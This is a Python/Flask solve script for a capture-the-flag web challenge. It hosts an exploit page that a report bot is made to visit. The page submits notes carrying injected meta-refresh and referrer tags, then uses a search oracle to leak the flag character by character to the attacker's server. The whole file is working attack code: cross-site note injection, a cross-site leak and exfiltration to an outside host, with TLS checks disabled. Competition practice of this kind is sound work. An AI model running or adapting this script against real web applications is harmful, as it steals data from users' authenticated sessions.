#!/usr/bin/env python3

import ssl
import subprocess
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path

from flask import Flask, request

# ── configure these ────────────────────────────────────────────────────────────
TARGET_URL      = "https://challctf.find-it.id:8023"
PUBLIC_URL      = "https://solve.1pc.tf"
PORT            = 4444
DOMAIN          = "solve.1pc.tf"
USE_HTTPS       = False   # set True when running standalone; False behind Traefik
KNOWN_PREFIX    = "FindITCTF{"
ALPHABET        = "}_abcdefghijklmnopqrstuvwxyz1234567890"
ATTEMPTS        = 12
DELAY_MS        = 200
START_DELAY_MS  = 2000
REFERER_TIMEOUT = 15.0
# ───────────────────────────────────────────────────────────────────────────────

EXPLOIT_PAGE = """<!doctype html>
<html><body>
<form method="post" target="p">
  <input type="text" name="content">
</form>
<script>
(async () => {
  const cfg = await fetch("/config").then(r => r.json());
  const { target, prefix, chars, attempts, delay_ms, start_delay_ms } = cfg;

  const form  = document.querySelector("form");
  const input = document.querySelector("input");
  form.action = target + "/create-note";

  const sleep = ms => new Promise(r => setTimeout(r, ms));

  function createNote(value) { input.value = value; form.submit(); }

  async function getNoteId(value) {
    open(`${target}/search-notes?query=view:${encodeURIComponent(value)}`, "p");
    const res = await fetch("/get-referer", { cache: "no-store" });
    if (!res.ok) throw new Error(`get-referer ${res.status}`);
    return res.text();
  }

  async function leak(known) {
    const pref = "*" + ["@", ...chars].map(c => known + c).join("|");
    for (let i = 0; i < attempts; i++) {
      createNote(`${pref}<meta name="referrer" content="unsafe-url"><meta http-equiv="Refresh" content="0; URL=${location.origin}/set-referer">`);
      await sleep(delay_ms);
    }
    const baseline = await getNoteId(known + "@");
    for (const c of chars) {
      const cur = await getNoteId(known + c);
      if (cur !== baseline) return known + c;
    }
    throw new Error("char not found");
  }

  async function main() {
    let known = prefix;
    while (!known.endsWith("}")) {
      known = await leak(known);
      fetch("/progress?flag=" + encodeURIComponent(known));
    }
    fetch("/progress?flag=" + encodeURIComponent(known));
  }

  await sleep(start_delay_ms);
  main().catch(e => fetch("/progress?error=" + encodeURIComponent(String(e))));
})();
</script>
</body></html>
"""


class RefererState:
    def __init__(self):
        self._cond = threading.Condition()
        self._val  = None

    def set(self, val):
        with self._cond:
            while self._val is not None:
                self._cond.wait(0.1)
            self._val = val
            self._cond.notify_all()

    def pop(self, timeout):
        deadline = time.monotonic() + timeout
        with self._cond:
            while self._val is None:
                rem = deadline - time.monotonic()
                if rem <= 0:
                    return None
                self._cond.wait(min(0.1, rem))
            val, self._val = self._val, None
            self._cond.notify_all()
            return val


def make_cert():
    d    = tempfile.mkdtemp(prefix="solve-cert-")
    cert = Path(d) / "cert.pem"
    key  = Path(d) / "key.pem"
    cfg  = Path(d) / "openssl.cnf"
    cfg.write_text(
        f"[req]\ndefault_bits=2048\nprompt=no\ndefault_md=sha256\n"
        f"distinguished_name=dn\nx509_extensions=v3\n\n"
        f"[dn]\nCN={DOMAIN}\n\n[v3]\nsubjectAltName=DNS:{DOMAIN}\n"
    )
    subprocess.run(
        ["openssl", "req", "-x509", "-nodes", "-newkey", "rsa:2048",
         "-days", "7", "-keyout", str(key), "-out", str(cert), "-config", str(cfg)],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    return str(cert), str(key)


def submit_to_bot():
    time.sleep(1.0)
    url  = TARGET_URL.rstrip("/") + "/report/"
    body = urllib.parse.urlencode({"url": PUBLIC_URL.rstrip("/") + "/"}).encode()
    req  = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    ctx = ssl._create_unverified_context()
    try:
        with urllib.request.urlopen(req, timeout=120, context=ctx) as r:
            print(f"[+] report: {r.status} {r.read().decode()}", flush=True)
    except Exception as e:
        print(f"[!] report failed: {e}", flush=True)


state = RefererState()
flag  = {"value": KNOWN_PREFIX}
app   = Flask(__name__)


@app.get("/")
def home():
    return EXPLOIT_PAGE, 200, {"Content-Type": "text/html"}


@app.get("/config")
def config():
    return {
        "target":         TARGET_URL.rstrip("/"),
        "prefix":         KNOWN_PREFIX,
        "chars":          ALPHABET,
        "attempts":       ATTEMPTS,
        "delay_ms":       DELAY_MS,
        "start_delay_ms": START_DELAY_MS,
    }


@app.get("/set-referer")
def set_referer():
    ref = request.headers.get("Referer", "")
    if not ref:
        return "missing referer", 400
    state.set(ref)
    return "ok", 200


@app.get("/get-referer")
def get_referer():
    ref = state.pop(REFERER_TIMEOUT)
    return ("timeout", 504) if ref is None else (ref, 200)


@app.get("/progress")
def progress():
    f = request.args.get("flag")
    e = request.args.get("error")
    if f and f != flag["value"]:
        flag["value"] = f
        print(f"[+] {f}", flush=True)
    if e:
        print(f"[!] {e}", flush=True)
    return "ok", 200


if __name__ == "__main__":
    print(f"[+] target : {TARGET_URL}", flush=True)
    print(f"[+] public : {PUBLIC_URL}", flush=True)
    ssl_context = None
    if USE_HTTPS:
        cert, key = make_cert()
        ssl_context = (cert, key)
    threading.Thread(target=submit_to_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=PORT, ssl_context=ssl_context,
            debug=False, threaded=True, use_reloader=False)
